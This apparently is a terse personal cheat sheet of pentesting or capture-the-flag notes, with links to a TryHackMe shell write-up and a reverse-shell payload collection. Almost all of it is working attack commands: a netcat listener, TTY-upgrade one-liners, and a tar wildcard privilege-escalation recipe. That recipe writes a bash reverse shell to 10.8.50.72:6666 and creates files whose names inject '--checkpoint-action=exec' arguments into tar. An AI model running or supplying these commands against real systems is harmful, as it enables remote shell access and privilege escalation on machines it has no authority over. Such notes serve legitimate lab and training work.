php reverse.shell
#### rlwrap nc -lvnp <port>
#### no tty present and no askpass program specified.
````
python3 -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
`````
(https://www.kumaratuljaiswal.in/2021/01/tryhackme-intro-to-shell-all-about-shell.html)
(https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

####Gotbin - tar
````
$ printf '#!/bin/bash\nbash -i >& /dev/tcp/10.8.50.72/6666 0>&1' > /var/www/html/shell
$ chmod +x /var/www/html/shell
$ touch /var/www/html/--checkpoint=1
$ touch /var/www/html/--checkpoint-action=exec=bash\ shell
`````
